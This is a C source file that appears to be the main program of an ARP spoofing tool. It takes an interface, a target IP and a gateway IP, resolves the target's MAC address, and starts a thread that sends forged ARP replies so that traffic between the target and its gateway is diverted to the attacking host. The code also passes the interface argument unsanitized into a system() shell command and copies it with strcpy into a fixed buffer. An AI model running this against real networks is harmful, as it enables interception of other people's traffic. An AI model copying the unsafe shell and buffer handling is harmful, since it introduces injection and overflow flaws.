#include "arpspoof.h"
#include <pthread.h>


void usage()
{
    fprintf(stderr, "Usage: ./arp_spoofing <interface> <target> <gateway>\n");
    exit(0);
}

int main(int argc, char** argv[]){
    if(argc != 4)
        usage();

    uint8_t *ip_target = (uint8_t*) calloc(4, sizeof(uint8_t));
    uint8_t *ip_gateway = (uint8_t*) calloc(4, sizeof(uint8_t));

    char interface[IFNAMSIZ];
    strcpy(interface, argv[1]);
    sscanf(argv[2], "%hhd.%hhd.%hhd.%hhd",
                    (uint8_t *) ip_target,
                    (uint8_t *) (ip_target+1),
                    (uint8_t *) (ip_target+2),
                    (uint8_t *) (ip_target+3));
    sscanf(argv[3], "%hhd.%hhd.%hhd.%hhd",
                    (uint8_t *) ip_gateway,
                    (uint8_t *) (ip_gateway+1),
                    (uint8_t *) (ip_gateway+2),
                    (uint8_t *) (ip_gateway+3));     


    int sock_r = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if(sock_r < 0)
    {
        fprintf(stderr, "Error in creating socket\n");
        return -1;
    }
    char cmd[1024];
    memset(cmd, 0, 1024);
    sprintf(cmd, "ip link set dev %s arp off", interface);
    system(cmd);
    //system("ip link set dev h1-eth0 arp off");  //turn off arp of the interface
    struct ifreq if_idx, if_mac, if_ip;

    //copy :()
    /* Get the index of the interface to send on */
	memset(&if_idx, 0, sizeof(struct ifreq));
	strncpy(if_idx.ifr_name, interface, IFNAMSIZ-1);
	if (ioctl(sock_r, SIOCGIFINDEX, &if_idx) < 0)
	    perror("SIOCGIFINDEX");

	/* Get the MAC address of the interface to send on */
	memset(&if_mac, 0, sizeof(struct ifreq));
	strncpy(if_mac.ifr_name, interface, IFNAMSIZ-1);
	if (ioctl(sock_r, SIOCGIFHWADDR, &if_mac) < 0)
	    perror("SIOCGIFHWADDR");

     /* Get the IP of the interface to send on */
	memset(&if_ip, 0, sizeof(struct ifreq));
	strncpy(if_ip.ifr_name, interface, IFNAMSIZ-1);
	if (ioctl(sock_r, SIOCGIFADDR, &if_ip) < 0)
	    perror("SIOCGIFADDR");
    //

    uint8_t *my_ip = (uint8_t*) calloc(4, sizeof(uint8_t));
    uint8_t *my_mac = (uint8_t*) calloc(ETH_ALEN, sizeof(uint8_t));
    int i;
    printf("_________________________________\n");
    for(i=0;i<6;i++)
        *(my_mac+i) = if_mac.ifr_hwaddr.sa_data[i];
    for(i=2;i<6;i++)
        *(my_ip+i-2) = if_ip.ifr_addr.sa_data[i];
    fprintf(stderr, "my MAC: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", *my_mac, *(my_mac+1), *(my_mac+2), *(my_mac+3), *(my_mac+4), *(my_mac+5));
    fprintf(stderr, "my IP: %d.%d.%d.%d\n", *my_ip, *(my_ip+1), *(my_ip+2), *(my_ip+3));
    struct sockaddr_ll socket_address;
    socket_address.sll_ifindex = if_idx.ifr_ifindex;
    socket_address.sll_halen = ETH_ALEN;
    socket_address.sll_family = AF_PACKET;
    unsigned int addr_len = (unsigned int) sizeof(struct sockaddr_ll);
    uint8_t *target_mac;
    target_mac = get_target_mac(sock_r,socket_address, addr_len, my_mac, my_ip, ip_target);
    fprintf(stderr, "Target MAC: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", *target_mac, *(target_mac+1), *(target_mac+2), *(target_mac+3), *(target_mac+4), *(target_mac+5));


    pthread_t attacking;

    attacking_args_t *args = (attacking_args_t*) malloc(sizeof(attacking_args_t));

    args->sock_r = sock_r;
    args->socket_address = socket_address;
    args->addr_len = addr_len;
    args->my_mac = my_mac;
    args->target_mac = target_mac;
    args->gateway_ip = ip_gateway;
    args->target_ip = ip_target;
    pthread_create(&attacking, NULL, send_arp_reply_fmac, (void*) args);
    pthread_join(attacking, NULL);
    free(args);
}